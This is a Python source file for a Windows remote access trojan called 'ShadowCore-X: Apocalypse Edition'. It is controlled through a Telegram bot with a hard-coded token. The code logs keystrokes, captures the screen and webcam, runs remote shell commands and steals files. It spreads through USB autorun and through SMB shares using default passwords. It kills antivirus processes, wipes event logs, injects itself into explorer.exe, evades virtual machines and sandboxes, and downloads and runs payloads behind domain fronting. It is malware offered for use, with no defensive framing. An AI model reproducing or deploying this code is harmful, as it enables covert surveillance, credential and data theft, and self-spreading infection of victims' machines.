#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ShadowCore-X: Apocalypse Edition v3.4 - Ultimate Pakistan Edition
import ctypes
import sys
import os
import time
import struct
import zlib
import hashlib
import threading
import winreg
import socket
import select
import psutil
import shutil
import subprocess
import ipaddress
import win32api
import win32con
import win32file
import win32security
import win32process
import base64
import pyautogui
import cv2
import numpy as np
import keyboard
import tempfile
import random
import io
import re
import configparser
import json
import concurrent.futures
from Crypto.Cipher import AES, ChaCha20
from Crypto.Hash import HMAC, SHA256, SHA512
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import requests
from telebot import TeleBot, types, apihelper
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== ENHANCED CONFIGURATION =====
class ApocalypseConfig:
    def __init__(self):
        self.config = configparser.ConfigParser()
        self.config_file = os.path.join(os.path.dirname(sys.executable), 'windows_settings.ini')
        self.defaults = {
            'STEALTH_MODE': 'True',
            'AUTO_SPREAD': 'True',
            'NETWORK_SCAN_INTERVAL': '300',
            'COMMS_TIMEOUT': '180',
            'BOT_TOKEN': '8388440776:AAF2vAJuxw-mKJ-N4JKHqSLru0ogHCAOk1A',
            'USER_ID': '5888374938',
            'POLYMORPH': 'True',
            'DECOY_PROCESS': 'svchost.exe',
            'C2_FRONT': 'cdn.microsoft.com',
            'PROXY_ENABLED': 'False',
            'PROXY_HOST': 'tproxy.site',
            'PROXY_PORT': '443',
            'PROXY_SECRET': 'd41d8cd98f00b204e9800998ecf8427e',
            'PROXY_REFRESH': '86400'
        }

        if not os.path.exists(self.config_file):
            self.create_default_config()

        self.load_config()
        self.refresh_proxies()

    def create_default_config(self):
        self.config['WINDOWS_SETTINGS'] = self.defaults
        with open(self.config_file, 'w') as configfile:
            self.config.write(configfile)
        win32api.SetFileAttributes(self.config_file, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)

    def load_config(self):
        self.config.read(self.config_file)
        self.STEALTH_MODE = self.config.getboolean('WINDOWS_SETTINGS', 'STEALTH_MODE')
        self.AUTO_SPREAD = self.config.getboolean('WINDOWS_SETTINGS', 'AUTO_SPREAD')
        self.NETWORK_SCAN_INTERVAL = self.config.getint('WINDOWS_SETTINGS', 'NETWORK_SCAN_INTERVAL')
        self.COMMS_TIMEOUT = self.config.getint('WINDOWS_SETTINGS', 'COMMS_TIMEOUT')
        self.BOT_TOKEN = self.decrypt_setting(self.config.get('WINDOWS_SETTINGS', 'BOT_TOKEN'))
        self.USER_ID = self.config.get('WINDOWS_SETTINGS', 'USER_ID')
        self.POLYMORPH = self.config.getboolean('WINDOWS_SETTINGS', 'POLYMORPH')
        self.DECOY_PROCESS = self.config.get('WINDOWS_SETTINGS', 'DECOY_PROCESS')
        self.C2_FRONT = self.config.get('WINDOWS_SETTINGS', 'C2_FRONT')
        self.PROXY_ENABLED = self.config.getboolean('WINDOWS_SETTINGS', 'PROXY_ENABLED')
        self.PROXY_HOST = self.decrypt_setting(self.config.get('WINDOWS_SETTINGS', 'PROXY_HOST'))
        self.PROXY_PORT = self.config.getint('WINDOWS_SETTINGS', 'PROXY_PORT')
        self.PROXY_SECRET = self.decrypt_setting(self.config.get('WINDOWS_SETTINGS', 'PROXY_SECRET'))
        self.PROXY_REFRESH = self.config.getint('WINDOWS_SETTINGS', 'PROXY_REFRESH')

    def save_config(self):
        self.config.set('WINDOWS_SETTINGS', 'BOT_TOKEN', self.encrypt_setting(self.BOT_TOKEN))
        self.config.set('WINDOWS_SETTINGS', 'PROXY_HOST', self.encrypt_setting(self.PROXY_HOST))
        self.config.set('WINDOWS_SETTINGS', 'PROXY_SECRET', self.encrypt_setting(self.PROXY_SECRET))
        with open(self.config_file, 'w') as configfile:
            self.config.write(configfile)
        win32api.SetFileAttributes(self.config_file, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)

    def encrypt_setting(self, value):
        salt = get_random_bytes(16)
        key = hashlib.pbkdf2_hmac('sha256', CRYPTO_SEED, salt, 100000, 32)
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(value.encode(), AES.block_size))
        return base64.b64encode(salt + cipher.iv + ct_bytes).decode()

    def decrypt_setting(self, value):
        try:
            data = base64.b64decode(value.encode())
            salt, iv, ct = data[:16], data[16:32], data[32:]
            key = hashlib.pbkdf2_hmac('sha256', CRYPTO_SEED, salt, 100000, 32)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode()
        except:
            return ""

    def update_setting(self, key, value):
        if hasattr(self, key):
            setattr(self, key, value)
            if key in ['BOT_TOKEN', 'PROXY_HOST', 'PROXY_SECRET']:
                self.config.set('WINDOWS_SETTINGS', key, self.encrypt_setting(value))
            else:
                self.config.set('WINDOWS_SETTINGS', key, str(value))
            self.save_config()

    def refresh_proxies(self):
        if not self.PROXY_ENABLED or not self.PROXY_REFRESH:
            return

        try:
            response = requests.get(
                'https://mtpro.xyz/api/?type=mtproto',
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'},
                timeout=15,
                verify=False
            )
            if response.status_code == 200:
                proxies = response.json().get('proxies', [])
                if proxies:
                    proxy = random.choice(proxies)
                    self.PROXY_HOST = proxy['server']
                    self.PROXY_PORT = proxy['port']
                    self.PROXY_SECRET = proxy['secret']
                    self.save_config()
        except:
            pass

    def setup_proxy(self):
        if self.PROXY_ENABLED and self.PROXY_HOST and self.PROXY_SECRET:
            proxy_url = f"mtproto://{self.PROXY_SECRET}@{self.PROXY_HOST}:{self.PROXY_PORT}"
            apihelper.proxy = {'https': proxy_url}
            return True
        return False

# Initialize configuration
CRYPTO_SEED = hashlib.sha512(socket.gethostname().encode() + os.getlogin().encode()).digest()
cfg = ApocalypseConfig()
DEVICE_ID = hashlib.sha256(socket.gethostbyname(socket.gethostname()).encode() + os.getlogin().encode()).hexdigest()[:8]
MUTEX_NAME = f"Global\\WinSec_{DEVICE_ID}"
KEYLOG_BUFFER = []
KEYLOG_LOCK = threading.Lock()
KEYLOG_ACTIVE = False

# ===== QUANTUM ENCRYPTION =====
class ApocalypseEncrypt:
    def __init__(self, key=None):
        self.key = key or hashlib.shake_256(os.urandom(64)).digest(64)
        self.nonce = os.urandom(16)

    def encrypt(self, data):
        if isinstance(data, str):
            data = data.encode()
        cipher = ChaCha20.new(key=self.key[:32], nonce=self.nonce)
        ct = cipher.encrypt(data)
        hmac = HMAC.new(self.key[32:], ct, SHA256).digest()
        return self.nonce + ct + hmac

    def decrypt(self, data):
        if len(data) < 48:
            return None
        nonce = data[:16]
        ct = data[16:-32]
        hmac = data[-32:]
        verify = HMAC.new(self.key[32:], ct, SHA256).digest()
        if hmac != verify:
            return None
        cipher = ChaCha20.new(key=self.key[:32], nonce=nonce)
        return cipher.decrypt(ct)

# ===== KEYLOGGER MODULE =====
class PhantomKeylogger(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        self.buffer = []
        self.crypto = ApocalypseEncrypt()
        self.active = False

    def run(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def callback(self, event):
        if self.active:
            key = event.name
            if len(key) > 1:
                key = f"[{key.upper()}]"
            self.buffer.append(key)
            if len(self.buffer) > 50:
                self.save_log()

    def save_log(self):
        log = ' '.join(self.buffer)
        encrypted = self.crypto.encrypt(log)
        with KEYLOG_LOCK:
            KEYLOG_BUFFER.append(encrypted)
        self.buffer = []

    def get_logs(self):
        with KEYLOG_LOCK:
            if KEYLOG_BUFFER:
                logs = b''.join(KEYLOG_BUFFER)
                return base64.b64encode(logs).decode()
        return None

    def clear_logs(self):
        with KEYLOG_LOCK:
            KEYLOG_BUFFER.clear()
        self.buffer = []

# ===== VISUAL MODULES =====
class VisualHunter:
    def __init__(self):
        self.crypto = ApocalypseEncrypt()

    def capture_screen(self):
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=70)
            encrypted = self.crypto.encrypt(img_bytes.getvalue())
            return encrypted
        except Exception as e:
            return None

    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            if not cap.isOpened():
                return None
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
                encrypted = self.crypto.encrypt(buffer.tobytes())
                return encrypted
        except:
            pass
        return None

# ===== SHELL EXECUTOR =====
class ShadowShell:
    def execute(self, command):
        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            result = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=60
            )
            return result.decode('utf-8', errors='ignore')[:4000]
        except Exception as e:
            return f"Error: {str(e)}"

# ===== FILE OPERATIONS =====
class FileReaper:
    def __init__(self):
        self.crypto = ApocalypseEncrypt()

    def steal_file(self, path):
        try:
            if not os.path.exists(path) or os.path.isdir(path):
                return None
            with open(path, 'rb') as f:
                data = f.read()
            if len(data) > 10 * 1024 * 1024:  # 10MB limit
                return b'FILE_TOO_LARGE'
            encrypted = self.crypto.encrypt(data)
            return encrypted
        except:
            return None

    def list_directory(self, path):
        try:
            if not os.path.exists(path):
                return "Path not found"
            if not os.path.isdir(path):
                return "Not a directory"

            files = []
            for entry in os.scandir(path):
                if entry.is_dir():
                    files.append(f"[DIR]  {entry.name}")
                else:
                    size = os.path.getsize(entry.path)
                    files.append(f"[FILE] {entry.name} ({size//1024} KB)")
            return '\n'.join(files[:50])  # Limit to 50 entries
        except:
            return "Access denied"

# ===== PROPAGATION MODULES =====
class USBInfector(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        self.last_drives = []

    def run(self):
        while True:
            current_drives = self.get_removable_drives()
            new_drives = [d for d in current_drives if d not in self.last_drives]

            for drive in new_drives:
                threading.Thread(target=self.infect_drive, args=(drive,)).start()

            self.last_drives = current_drives
            time.sleep(15)

    def get_removable_drives(self):
        drives = []
        for drive in win32api.GetLogicalDriveStrings().split('\x00')[:-1]:
            if win32file.GetDriveType(drive) == win32file.DRIVE_REMOVABLE:
                drives.append(drive)
        return drives

    def infect_drive(self, drive):
        try:
            current_path = sys.executable
            target_name = random.choice([
                "Windows Update Assistant.exe",
                "Document Scanner.exe",
                "Driver Installer.exe"
            ])
            target_path = os.path.join(drive, target_name)

            # Copy payload
            shutil.copyfile(current_path, target_path)

            # Create autorun.inf
            autorun = f"""
[AutoRun]
open={target_name}
action=Open folder to view files
icon=shell32.dll,4
"""
            with open(os.path.join(drive, "autorun.inf"), "w") as f:
                f.write(autorun)

            # Set hidden attributes
            win32api.SetFileAttributes(target_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            win32api.SetFileAttributes(os.path.join(drive, "autorun.inf"), win32con.FILE_ATTRIBUTE_HIDDEN)

            # Set registry for autorun
            self.set_registry_autorun(drive[0])
            return True
        except Exception as e:
            return False

    def set_registry_autorun(self, drive_letter):
        try:
            key_path = f"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\{drive_letter}"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
                winreg.SetValueEx(key, "BaseClass", 0, winreg.REG_SZ, "Drive")
            return True
        except:
            return False

class NetworkDominator(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        self.credentials = {
            'admin': 'P@ssw0rd!',
            'Administrator': 'Password123',
            'User': 'Welcome1'
        }

    def run(self):
        while cfg.AUTO_SPREAD:
            self.scan_network()
            time.sleep(cfg.NETWORK_SCAN_INTERVAL)

    def get_network_ranges(self):
        ranges = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET and not addr.address.startswith('127.'):
                    try:
                        net = ipaddress.IPv4Network(f"{addr.address}/{addr.netmask}", strict=False)
                        if net.prefixlen < 24:  # Limit to /24 subnets
                            net = list(net.subnets(new_prefix=24))[0]
                        ranges.append(str(net))
                    except:
                        pass
        return list(set(ranges))

    def scan_subnet(self, subnet):
        network = ipaddress.ip_network(subnet)
        hosts = [str(ip) for ip in network.hosts()]
        random.shuffle(hosts)  # Randomize scan order

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            executor.map(self.check_and_infect, hosts)

    def check_and_infect(self, ip):
        try:
            # Check SMB port first
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if s.connect_ex((ip, 445)) != 0:
                return
            s.close()

            # Try to infect
            self.infect_network_share(ip)
        except:
            pass

    def infect_network_share(self, ip):
        try:
            share_path = f"\\\\{ip}\\C$\\Windows\\Temp"
            if not os.path.exists(share_path):
                return False

            target_name = random.choice([
                "WindowsSecurityCenter.exe",
                "SystemHealthMonitor.exe",
                "UpdateManager.exe"
            ])
            target_path = os.path.join(share_path, target_name)

            shutil.copyfile(sys.executable, target_path)

            # Create scheduled task
            for user, pwd in self.credentials.items():
                command = (
                    f'schtasks /create /s {ip} /u "{user}" /p "{pwd}" '
                    f'/ru System /sc ONSTART /tn "Windows Security Update" '
                    f'/tr "{target_path}" /f'
                )
                result = subprocess.run(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                if result.returncode == 0:
                    return True
            return False
        except:
            return False

# ===== DEFENSE EVASION =====
class AntiAnalysis:
    @staticmethod
    def detect_vm():
        vm_indicators = [
            "vboxservice.exe", "vboxtray.exe", "vmwaretray.exe",
            "xenservice.exe", "qemu-ga.exe", "vmtoolsd.exe"
        ]
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in vm_indicators:
                return True

        # Check MAC address
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == psutil.AF_LINK:
                    mac = addr.address.lower()
                    if any(x in mac for x in ['08:00:27', '00:1c:42', '00:0c:29']):
                        return True
        return False

    @staticmethod
    def detect_debugger():
        kernel32 = ctypes.windll.kernel32
        return kernel32.IsDebuggerPresent() or kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), False)

    @staticmethod
    def detect_sandbox():
        # Check for low resource environments
        if psutil.virtual_memory().total < 2 * 1024**3:  # < 2GB RAM
            return True
        if len(psutil.disk_partitions()) < 2:
            return True
        return False

    @staticmethod
    def kill_av():
        targets = ["msmpeng.exe", "mbam.exe", "avp.exe", "bdagent.exe", "avastui.exe", "mcshield.exe"]
        killed = []
        for proc in psutil.process_iter():
            try:
                name = proc.name().lower()
                if name in targets:
                    proc.kill()
                    killed.append(name)
            except:
                pass
        return killed

    @staticmethod
    def wipe_forensic_artifacts():
        try:
            # Clear event logs
            os.system("wevtutil cl System >nul 2>&1")
            os.system("wevtutil cl Security >nul 2>&1")
            os.system("wevtutil cl Application >nul 2>&1")

            # Clear prefetch
            prefetch_dir = os.path.join(os.environ['WINDIR'], 'Prefetch')
            if os.path.exists(prefetch_dir):
                for f in os.listdir(prefetch_dir):
                    if f.endswith('.pf'):
                        try:
                            os.remove(os.path.join(prefetch_dir, f))
                        except:
                            pass

            # Clear temp files
            temp_dir = os.environ['TEMP']
            for f in os.listdir(temp_dir):
                try:
                    os.remove(os.path.join(temp_dir, f))
                except:
                    pass
        except:
            pass

# ===== PERSISTENCE =====
class ShadowReplicator:
    def __init__(self):
        self.locations = [
            os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\SecurityHealthSystray.exe'),
            os.path.join(os.environ['PROGRAMDATA'], 'Microsoft\\WindowsSecurity\\SecurityCore.exe'),
            os.path.join(os.environ['WINDIR'], 'System32\\DriverStore\\Drivers\\netcore.sys'),
            os.path.join(os.environ['WINDIR'], 'Temp\\WindowsUpdate.exe')
        ]

    def replicate(self):
        current_path = sys.executable
        for target in self.locations:
            try:
                target_dir = os.path.dirname(target)
                if not os.path.exists(target_dir):
                    os.makedirs(target_dir, exist_ok=True)
                shutil.copyfile(current_path, target)
                win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
                self.set_persistence(target)
            except:
                pass

    def set_persistence(self, path):
        try:
            # Registry persistence
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "WindowsSecurityCenter", 0, winreg.REG_SZ, path)

            # Scheduled task
            task_name = "WindowsSecurityUpdate"
            command = (
                f'schtasks /create /tn "{task_name}" '
                f'/tr "{path}" /sc ONLOGON /ru SYSTEM /f'
            )
            subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except:
            return False

# ===== PROCESS INJECTION =====
class GhostInjector:
    @staticmethod
    def inject_into_process(target_process="explorer.exe"):
        try:
            # Get target process ID
            pid = None
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'].lower() == target_process.lower():
                    pid = proc.info['pid']
                    break
            if not pid:
                return False

            # Open process
            PROCESS_ALL_ACCESS = 0x1F0FFF
            process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not process:
                return False

            # Allocate memory
            path = sys.executable.encode('utf-16le') + b'\x00\x00'
            size = len(path)
            alloc_addr = ctypes.windll.kernel32.VirtualAllocEx(
                process, None, size, 0x1000 | 0x2000, 0x40
            )
            if not alloc_addr:
                ctypes.windll.kernel32.CloseHandle(process)
                return False

            # Write payload path
            written = ctypes.c_ulong(0)
            ctypes.windll.kernel32.WriteProcessMemory(
                process, alloc_addr, path, size, ctypes.byref(written))

            # Create remote thread
            load_lib_addr = ctypes.windll.kernel32.GetProcAddress(
                ctypes.windll.kernel32.GetModuleHandleA(b"kernel32.dll"),
                b"LoadLibraryW"
            )
            thread_id = ctypes.c_ulong(0)
            thread = ctypes.windll.kernel32.CreateRemoteThread(
                process, None, 0, load_lib_addr, alloc_addr, 0, ctypes.byref(thread_id))

            if not thread:
                ctypes.windll.kernel32.VirtualFreeEx(process, alloc_addr, 0, 0x8000)
                ctypes.windll.kernel32.CloseHandle(process)
                return False

            # Cleanup
            ctypes.windll.kernel32.WaitForSingleObject(thread, 0xFFFFFFFF)
            ctypes.windll.kernel32.CloseHandle(thread)
            ctypes.windll.kernel32.VirtualFreeEx(process, alloc_addr, 0, 0x8000)
            ctypes.windll.kernel32.CloseHandle(process)
            return True
        except:
            return False

# ===== C2 COMMUNICATIONS =====
class ApocalypseComms:
    def __init__(self):
        cfg.setup_proxy()  # Apply proxy immediately
        self.bot = TeleBot(cfg.BOT_TOKEN)
        self.keylogger = PhantomKeylogger()
        self.visual_hunter = VisualHunter()
        self.shell_executor = ShadowShell()
        self.file_reaper = FileReaper()
        self.devices = {}
        self.active_target = DEVICE_ID
        self.register_handlers()
        self.proxy_last_refresh = time.time()

    def register_handlers(self):
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            if str(message.from_user.id) != cfg.USER_ID:
                return
            self.bot.reply_to(message, f"🔥 Apocalypse C2 Online!\nDevice ID: `{DEVICE_ID}`", parse_mode='Markdown')

        @self.bot.message_handler(commands=['devices'])
        def handle_devices(message):
            if str(message.from_user.id) != cfg.USER_ID:
                return

            # Remove stale devices
            current_time = time.time()
            stale = [did for did, last_seen in self.devices.items()
                     if (current_time - last_seen) > cfg.COMMS_TIMEOUT * 3]
            for did in stale:
                del self.devices[did]

            if not self.devices:
                self.bot.reply_to(message, "❌ No active devices")
                return

            response = "🖥️ ACTIVE DEVICES:\n\n"
            for did, last_seen in self.devices.items():
                status = "� ONLINE" if (current_time - last_seen) < cfg.COMMS_TIMEOUT else "🔴 OFFLINE"
                response += f"• `{did}` | {status} | Last seen: {int(current_time - last_seen)}s ago\n"

            self.bot.reply_to(message, response, parse_mode='Markdown')

        @self.bot.message_handler(commands=['target'])
        def handle_target(message):
            if str(message.from_user.id) != cfg.USER_ID:
                return

            device_id = message.text[7:].strip()
            if device_id in self.devices:
                self.active_target = device_id
                self.bot.reply_to(message, f"🎯 Target set to `{device_id}`", parse_mode='Markdown')
            else:
                self.bot.reply_to(message, "❌ Invalid device ID")

        @self.bot.message_handler(commands=['startlog'])
        def handle_startlog(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            self.keylogger.active = True
            self.bot.reply_to(message, "🔑 Keylogger activated!")

        @self.bot.message_handler(commands=['log'])
        def handle_log(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            log = self.keylogger.get_logs()
            if log:
                self.bot.send_document(message.chat.id, ('keylog.bin', io.BytesIO(log.encode())))
                self.keylogger.clear_logs()
                self.bot.reply_to(message, "📝 Keylog sent!")
            else:
                self.bot.reply_to(message, "❌ No keylog data available")

        @self.bot.message_handler(commands=['screen'])
        def handle_screen(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            screen = self.visual_hunter.capture_screen()
            if screen:
                self.bot.send_photo(message.chat.id, ('screenshot.jpg', io.BytesIO(screen)))
                self.bot.reply_to(message, "🖼️ Screenshot sent!")
            else:
                self.bot.reply_to(message, "❌ Screenshot capture failed")

        @self.bot.message_handler(commands=['cam'])
        def handle_cam(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            webcam = self.visual_hunter.capture_webcam()
            if webcam:
                self.bot.send_photo(message.chat.id, ('webcam.jpg', io.BytesIO(webcam)))
                self.bot.reply_to(message, "📸 Webcam snapshot sent!")
            else:
                self.bot.reply_to(message, "❌ Webcam capture failed")

        @self.bot.message_handler(commands=['shell'])
        def handle_shell(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            command = message.text[6:]  # Remove '/shell '
            result = self.shell_executor.execute(command)
            self.bot.reply_to(message, f"💻 Command Result:\n```\n{result}\n```", parse_mode='Markdown')

        @self.bot.message_handler(commands=['grab'])
        def handle_grab(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            path = message.text[6:]  # Remove '/grab '
            file_data = self.file_reaper.steal_file(path)
            if file_data == b'FILE_TOO_LARGE':
                self.bot.reply_to(message, "❌ File exceeds 10MB limit")
            elif file_data:
                self.bot.send_document(message.chat.id, (os.path.basename(path), io.BytesIO(file_data)))
                self.bot.reply_to(message, "📁 File downloaded!")
            else:
                self.bot.reply_to(message, "❌ File grab failed")

        @self.bot.message_handler(commands=['ls'])
        def handle_ls(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            path = message.text[4:] or "C:\\"
            listing = self.file_reaper.list_directory(path)
            self.bot.reply_to(message, f"📁 Directory Listing:\n```\n{listing}\n```", parse_mode='Markdown')

        @self.bot.message_handler(commands=['killav'])
        def handle_killav(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            killed = AntiAnalysis.kill_av()
            if killed:
                self.bot.reply_to(message, f"🛡️ AV terminated: {', '.join(killed)}")
            else:
                self.bot.reply_to(message, "❌ No AV processes found")

        @self.bot.message_handler(commands=['spread'])
        def handle_spread(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            cfg.update_setting('AUTO_SPREAD', True)
            self.bot.reply_to(message, "🌐 Network propagation activated!")

        @self.bot.message_handler(commands=['update'])
        def handle_update(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            url = message.text[8:]
            if url:
                threading.Thread(target=self.remote_update, args=(url,)).start()
                self.bot.reply_to(message, "🔄 Update initiated!")
            else:
                self.bot.reply_to(message, "❌ Missing URL")

        @self.bot.message_handler(commands=['config'])
        def handle_config(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            parts = message.text.split(maxsplit=2)
            if len(parts) < 3:
                self.bot.reply_to(message, "Usage: /config KEY VALUE")
                return

            key, value = parts[1], parts[2]
            valid_keys = ['STEALTH_MODE', 'AUTO_SPREAD', 'NETWORK_SCAN_INTERVAL',
                         'BOT_TOKEN', 'C2_FRONT', 'PROXY_ENABLED', 'PROXY_HOST',
                         'PROXY_PORT', 'PROXY_SECRET', 'PROXY_REFRESH']

            if key in valid_keys:
                if key in ['BOT_TOKEN', 'PROXY_HOST', 'PROXY_SECRET']:
                    setattr(cfg, key, value)
                else:
                    cfg.update_setting(key, value)

                # Reapply proxy if proxy settings changed
                if key.startswith('PROXY'):
                    cfg.setup_proxy()

                self.bot.reply_to(message, f"⚙️ {key} set to {value}")
            else:
                self.bot.reply_to(message, f"❌ Invalid config key. Valid: {', '.join(valid_keys)}")

        @self.bot.message_handler(commands=['kill'])
        def handle_kill(message):
            if str(message.from_user.id) != cfg.USER_ID or self.active_target != DEVICE_ID:
                return

            self.bot.reply_to(message, "💣 Self-destruct sequence initiated!")
            threading.Thread(target=self.wipe_and_self_destruct).start()

        @self.bot.message_handler(func=lambda m: m.text.startswith('HEARTBEAT:'))
        def handle_heartbeat(message):
            parts = message.text.split(':')
            if len(parts) < 2:
                return

            device_id = parts[1]
            self.devices[device_id] = time.time()
            if device_id == DEVICE_ID:
                self.bot.reply_to(message, f"❤️ {DEVICE_ID} active")

    def remote_update(self, url):
        try:
            # Domain fronting
            headers = {'Host': cfg.C2_FRONT, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
            response = requests.get(
                url,
                headers=headers,
                verify=False,
                timeout=30
            )
            if response.status_code != 200:
                return

            # Save to temp file
            temp_path = os.path.join(tempfile.gettempdir(), f'update_{random.randint(1000,9999)}.exe')
            with open(temp_path, 'wb') as f:
                f.write(response.content)

            # Create updater script
            bat = f"""
@echo off
timeout /t 5 /nobreak >nul
copy /Y "{temp_path}" "{sys.executable}" >nul
start "" "{sys.executable}"
del /f /q "{temp_path}" >nul
del /f /q "%~f0" >nul
"""
            bat_path = os.path.join(tempfile.gettempdir(), f'update_{random.randint(1000,9999)}.bat')
            with open(bat_path, 'w') as f:
                f.write(bat)

            # Execute silently
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(
                [bat_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except:
            pass

    def wipe_and_self_destruct(self):
        try:
            # Wipe forensic artifacts
            AntiAnalysis.wipe_forensic_artifacts()

            # Remove persistence
            try:
                key = winreg.HKEY_CURRENT_USER
                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                    winreg.DeleteValue(regkey, "WindowsSecurityCenter")
            except:
                pass

            # Remove scheduled task
            os.system('schtasks /delete /tn "WindowsSecurityUpdate" /f >nul 2>&1')

            # Self-destruct script
            bat = f"""
@echo off
timeout /t 3 >nul
del /f /q "{sys.executable}" >nul 2>&1
for %%i in ("{os.path.dirname(sys.executable)}\\*") do (
    del /f /q "%%i" >nul 2>&1
)
del /f /q "{cfg.config_file}" >nul 2>&1
del /f /q "%~f0" >nul 2>&1
"""
            bat_path = os.path.join(tempfile.gettempdir(), f'cleanup_{random.randint(1000,9999)}.bat')
            with open(bat_path, 'w') as f:
                f.write(bat)

            # Execute silently
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen(
                [bat_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            sys.exit(0)
        except:
            os._exit(0)

    def send_heartbeat(self):
        while True:
            try:
                # Auto-refresh proxies periodically
                if time.time() - self.proxy_last_refresh > cfg.PROXY_REFRESH:
                    cfg.refresh_proxies()
                    cfg.setup_proxy()
                    self.proxy_last_refresh = time.time()

                # Domain fronting for heartbeat
                headers = {'Host': cfg.C2_FRONT, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
                requests.post(
                    f"https://{cfg.C2_FRONT}/api/telemetry",
                    headers=headers,
                    data=f"HEARTBEAT:{DEVICE_ID}",
                    verify=False,
                    timeout=10
                )
            except:
                pass
            time.sleep(cfg.COMMS_TIMEOUT)

    def start(self):
        # Start keylogger in background
        self.keylogger.start()

        # Start heartbeat thread
        threading.Thread(target=self.send_heartbeat, daemon=True).start()

        # Start Telegram listener
        threading.Thread(target=self.bot.infinity_polling, daemon=True).start()

# ===== MAIN EXECUTION =====
def nemesis_init():
    # Create mutex for single instance
    mutex = ctypes.windll.kernel32.CreateMutexExW(
        None, MUTEX_NAME, 0, 0x1F0001
    )
    if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        sys.exit(0)

    # Anti-analysis checks
    if AntiAnalysis.detect_vm() or AntiAnalysis.detect_debugger() or AntiAnalysis.detect_sandbox():
        sys.exit(0)

    # Hide process window
    if cfg.STEALTH_MODE:
        win32gui = ctypes.WinDLL('user32')
        win32gui.ShowWindow(win32gui.GetConsoleWindow(), 0)

if __name__ == "__main__":
